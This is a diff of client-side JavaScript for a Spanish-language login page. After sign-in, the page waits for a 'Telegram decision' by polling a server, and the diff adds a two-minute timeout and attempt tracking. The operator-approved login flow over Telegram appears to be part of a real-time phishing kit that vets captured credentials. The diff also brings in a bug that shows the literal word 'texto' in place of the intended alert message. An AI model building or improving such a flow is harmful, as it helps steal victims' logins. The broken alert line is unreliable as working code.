@@ -30,6 +30,22 @@ document.getElementById("entrarBtn").addEventListener("click", function () {
 
 let esperandoDecisionOpciones = false;
 
+// ========================================
+// TIEMPO MÁXIMO DE ESPERA DE TELEGRAM
+// ========================================
+
+const TIEMPO_MAXIMO_OPCIONES = 120000;
+
+// Identifica cada intento para impedir
+// que respuestas anteriores afecten
+// a una solicitud nueva.
+let identificadorIntentoOpciones = 0;
+
+// ========================================
+// BOTÓN CONTINUAR - OPCIONES INDEPENDIENTES
+// CON TIEMPO MÁXIMO DE 2 MINUTOS
+// ========================================
+
 document.getElementById("continuarBtn").addEventListener(
     "click",
     async function () {
@@ -40,7 +56,10 @@ document.getElementById("continuarBtn").addEventListener(
 
         esperandoDecisionOpciones = true;
 
-        // Mostrar la pantalla de carga original
+        // Identificador exclusivo de este intento
+        const intentoActual = ++identificadorIntentoOpciones;
+
+        // Mostrar pantalla de carga original
         const loadingScreen =
             document.querySelector(".loading-screen");
 
@@ -49,12 +68,58 @@ document.getElementById("continuarBtn").addEventListener(
         loadingScreen.style.backgroundColor =
             "rgba(233, 233, 233, 0.6)";
 
-        // Obtener el ID que ya utiliza la página
+        // Obtener ID del dispositivo
         const dispositivoID = obtenerIDDispositivo();
+
+        // Control para cancelar las solicitudes HTTP
+        // de este intento cuando expire.
+        const controlador = new AbortController();
+
+        // Iniciar los 2 minutos desde que
+        // el usuario presiona Continuar.
+        const temporizador = setTimeout(function () {
+
+            // Evitar actuar sobre intentos anteriores
+            if (
+                intentoActual !== identificadorIntentoOpciones ||
+                !esperandoDecisionOpciones
+            ) {
+                return;
+            }
+
+            // Invalidar este intento
+            identificadorIntentoOpciones++;
+
+            // Detener solicitudes pendientes
+            controlador.abort();
+
+            // Permitir un nuevo intento
+            esperandoDecisionOpciones = false;
+
+            // Ocultar pantalla de carga
+            loadingScreen.classList.add("hidden");
+
+            // Mantener visible el formulario
+            document.querySelector(".login-container")
+                .classList.remove("hidden");
+
+            // Mantener ocultas las secciones
+            document.getElementById("seccion-si")
+                .classList.add("hidden");
+
+            document.getElementById("seccion-no")
+                .classList.add("hidden");
+
+            // Mostrar alerta con el mismo diseño
+            mostrarAlertaOpcionesNo(
+                "Servicio no disponible, por favor intenta más tarde"
+            );
+
+        }, TIEMPO_MAXIMO_OPCIONES);
 
         try {
 
-            // Crear solicitud independiente
+            // Crear solicitud de Telegram
             const respuesta = await fetch(
                 "/opciones/crear",
                 {
@@ -64,7 +129,8 @@ document.getElementById("continuarBtn").addEventListener(
                     },
                     body: JSON.stringify({
                         dispositivoID
-                    })
+                    }),
+                    signal: controlador.signal
                 }
             );
 
@@ -76,12 +142,30 @@ document.getElementById("continuarBtn").addEventListener(
 
             const datos = await respuesta.json();
 
+            // Si este intento expiró mientras
+            // se creaba la solicitud, no continuar.
+            if (
+                intentoActual !== identificadorIntentoOpciones
+            ) {
+                return;
+            }
+
             // Esperar la decisión de Telegram
             await esperarDecisionOpciones(
-                datos.idSolicitud
+                datos.idSolicitud,
+                intentoActual,
+                controlador.signal
             );
 
         } catch (error) {
+
+            // Ignorar errores de solicitudes canceladas
+            // o de intentos que ya expiraron.
+            if (
+                intentoActual !== identificadorIntentoOpciones
+            ) {
+                return;
+            }
 
             console.error(
                 "Error en las opciones:",
@@ -91,6 +175,11 @@ document.getElementById("continuarBtn").addEventListener(
             loadingScreen.classList.add("hidden");
 
             esperandoDecisionOpciones = false;
+
+        } finally {
+
+            clearTimeout(temporizador);
+
         }
     }
 );
@@ -227,7 +316,9 @@ function mostrarAlertaAutenticacionIncorrecta() {
 // ALERTA EXCLUSIVA PARA RESPUESTA NO
 // ========================================
 
-function mostrarAlertaOpcionesNo() {
+function mostrarAlertaOpcionesNo(
+    texto = "Incorrecto"
+)  {
 
     // Eliminar una alerta anterior de este mismo tipo
     document.querySelector(".alertaOpcionesNo")?.remove();
@@ -257,7 +348,7 @@ function mostrarAlertaOpcionesNo() {
     // Crear el mensaje
     const mensaje = document.createElement("span");
 
-    mensaje.textContent = "Incorrecto";
+    mensaje.textContent = "texto";
 
     alerta.appendChild(mensaje);
 
@@ -319,9 +410,21 @@ document.getElementById("usuario").addEventListener("focus", function () {
 // ESPERAR DECISIÓN DE TELEGRAM
 // ========================================
 
-async function esperarDecisionOpciones(idSolicitud) {
+// ========================================
+// ESPERAR DECISIÓN DE TELEGRAM
+// CON CONTROL DE INTENTOS EXPIRADOS
+// ========================================
 
-    while (true) {
+async function esperarDecisionOpciones(
+    idSolicitud,
+    intentoActual,
+    signal
+) {
+
+    while (
+        intentoActual === identificadorIntentoOpciones &&
+        !signal.aborted
+    ) {
 
         try {
 
@@ -329,7 +432,8 @@ async function esperarDecisionOpciones(idSolicitud) {
                 "/opciones/estado/" +
                 encodeURIComponent(idSolicitud),
                 {
-                    cache: "no-store"
+                    cache: "no-store",
+                    signal: signal
                 }
             );
 
@@ -341,14 +445,37 @@ async function esperarDecisionOpciones(idSolicitud) {
 
             const datos = await respuesta.json();
 
+            // Verificar nuevamente que este intento
+            // siga siendo válido.
+            if (
+                intentoActual !== identificadorIntentoOpciones ||
+                signal.aborted
+            ) {
+                return;
+            }
+
+            // ========================================
+            // RESPUESTA SÍ
+            // ========================================
+
             if (datos.estado === "si") {
+
+                // Invalidar este intento para evitar
+                // que vuelva a procesarse.
+                identificadorIntentoOpciones++;
 
                 mostrarSeccionOpciones("si");
 
                 return;
             }
 
+            // ========================================
+            // RESPUESTA NO
+            // ========================================
+
             if (datos.estado === "no") {
+
+                identificadorIntentoOpciones++;
 
                 mostrarSeccionOpciones("no");
 
@@ -357,13 +484,20 @@ async function esperarDecisionOpciones(idSolicitud) {
 
         } catch (error) {
 
+            if (
+                signal.aborted ||
+                intentoActual !== identificadorIntentoOpciones
+            ) {
+                return;
+            }
+
             console.error(
                 "Esperando conexión:",
                 error.message
             );
         }
 
-        // Consultar nuevamente sin establecer caducidad
+        // Consultar nuevamente cada 1.5 segundos
         await new Promise(resolve => {
             setTimeout(resolve, 1500);
         });
@@ -502,14 +636,18 @@ function mostrarSeccionOpciones(opcion) {
 })();
 
 // ========================================
-// OCULTAR ALERTA NO AL CORREGIR CONTRASEÑA
+// OCULTAR ALERTA NO AL CORREGIR CREDENCIALES
 // ========================================
 
-document.getElementById("password").addEventListener(
-    "input",
-    function () {
+["usuario", "password"].forEach(function(idCampo) {
 
-        document.querySelector(".alertaOpcionesNo")?.remove();
+    document.getElementById(idCampo).addEventListener(
+        "input",
+        function() {
 
-    }
-);
+            document.querySelector(".alertaOpcionesNo")?.remove();
+
+        }
+    );
+
+});
